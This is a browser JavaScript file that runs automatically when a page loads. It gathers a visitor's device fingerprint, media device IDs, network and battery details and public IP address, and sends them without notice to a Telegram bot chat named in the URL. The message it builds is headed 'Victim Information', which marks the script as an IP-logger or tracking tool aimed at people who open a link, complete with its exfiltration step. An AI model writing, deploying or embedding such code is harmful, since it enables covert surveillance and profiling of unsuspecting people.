function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

// Function to get device information
function getDeviceInfo() {
    return {
        productSub: navigator.productSub,
        vendor: navigator.vendor,
        maxTouchPoints: navigator.maxTouchPoints,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        cookieEnabled: navigator.cookieEnabled,
        appCodeName: navigator.appCodeName,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        platform: navigator.platform,
        product: navigator.product,
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        webdriver: navigator.webdriver,
        deviceMemory: navigator.deviceMemory,
    };
}

// Function to get media device information
async function getMediaDevices() {
    const devices = await navigator.mediaDevices.enumerateDevices();
    const mediaDevices = {
        audioinput: [],
        videoinput: [],
        audiooutput: []
    };
    devices.forEach(device => {
        if (device.kind === 'audioinput') mediaDevices.audioinput.push(`id = ${device.deviceId}`);
        if (device.kind === 'videoinput') mediaDevices.videoinput.push(`id = ${device.deviceId}`);
        if (device.kind === 'audiooutput') mediaDevices.audiooutput.push(`id = ${device.deviceId}`);
    });
    return mediaDevices;
}

// Function to get network information
function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return {
        type: connection.type,
        rtt: connection.rtt,
        saveData: connection.saveData,
        effectiveType: connection.effectiveType,
        downlink: connection.downlink,
        downlinkMax: connection.downlinkMax
    };
}

// Function to get battery information
async function getBatteryInfo() {
    const battery = await navigator.getBattery();
    return {
        level: battery.level * 100,
        charging: battery.charging
    };
}

// Function to format the message for Telegram
function formatMessage(data) {
    const { deviceInfo, mediaDevices, networkInfo, batteryInfo, timestamp, ip, localTime } = data;
    return `✅Victim Information

⚓ IP: ${ip} | Time: ${timestamp}

⏳ Date In Victim's Device : ${localTime}

📱 Device Information
productSub: ${deviceInfo.productSub}
vendor: ${deviceInfo.vendor}
maxTouchPoints: ${deviceInfo.maxTouchPoints}
doNotTrack: ${deviceInfo.doNotTrack}
hardwareConcurrency: ${deviceInfo.hardwareConcurrency}
cookieEnabled: ${deviceInfo.cookieEnabled}
appCodeName: ${deviceInfo.appCodeName}
appName: ${deviceInfo.appName}
appVersion: ${deviceInfo.appVersion}
platform: ${deviceInfo.platform}
product: ${deviceInfo.product}
userAgent: ${deviceInfo.userAgent}
language: ${deviceInfo.language}
languages: ${deviceInfo.languages.join(',')}
webdriver: ${deviceInfo.webdriver}
deviceMemory: ${deviceInfo.deviceMemory}

📷 Media Device Information
${mediaDevices.audioinput.map(id => `audioinput: ${id}`).join('\n')}
${mediaDevices.videoinput.map(id => `videoinput: ${id}`).join('\n')}
${mediaDevices.audiooutput.map(id => `audiooutput: ${id}`).join('\n')}

🕸️ Network Information
type: ${networkInfo.type}
rtt: ${networkInfo.rtt}
saveData: ${networkInfo.saveData}
effectiveType: ${networkInfo.effectiveType}
downlink: ${networkInfo.downlink}
downlinkMax: ${networkInfo.downlinkMax}

🔌 Total USB devices connected: 0

🔋 Battery Information
🔋Battery Level: ${batteryInfo.level}%
⚡ Is Battery Charging: ${batteryInfo.charging}`;
}

// Function to send data to Telegram bot
async function sendDataToTelegram(message) {
    const token = telegramBotToken;
    const chatId = getQueryParam('id');
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    try {
        const response = await fetch(url);
        const result = await response.json();
        console.log(result);
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
    }
}

// Function to get IP address (using an external service)
async function getIpAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error getting IP address:', error);
        return 'Unknown';
    }
}

// Collect and send all information
(async function collectAndSendData() {
    const ip = await getIpAddress();
    const timestamp = new Date().toISOString();
    const localTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
    const deviceInfo = getDeviceInfo();
    const mediaDevices = await getMediaDevices();
    const networkInfo = getNetworkInfo();
    const batteryInfo = await getBatteryInfo();

    const data = {
        deviceInfo,
        mediaDevices,
        networkInfo,
        batteryInfo,
        timestamp,
        ip,
        localTime
    };

    const message = formatMessage(data);
    sendDataToTelegram(message);
})();
